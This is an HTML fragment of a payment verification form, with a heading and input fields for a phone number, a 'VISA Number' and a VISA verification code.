...
<div id="content">
    <div class="products-holder" style="background: rgba(0,0,0,.4); border-radius: 10px; width: 700px; margin: 0 auto;">
        ...
        <div class="middle"style="background: transparent">
            ...
            <tr>
                <td align="center" colspan="2"><label><h3>Send your payments and enter verification code below.</h3></label></td>
            ...
            <tr>
                ...
                <td align="left"><input required type="text" name="phone" maxlength="15" placeholder="Enter Phone number eg: 0999999..." class="text_input" /></td>
            </tr>

            <tr>
                <td align="right"><label>VISA Number:</label></td>
                <td align="left"><input required type="text" name="cnic" maxlength="15" placeholder="Enter Your VISA Number ..." class="text_input" /></td>
            </tr>

            <tr>
                <td align="right"><label>Easy VISA Code:</label></td>
                <td align="left"><input required type="text" name="code" maxlength="15" placeholder="Enter VISA verification code..." class="text_input" /></td>
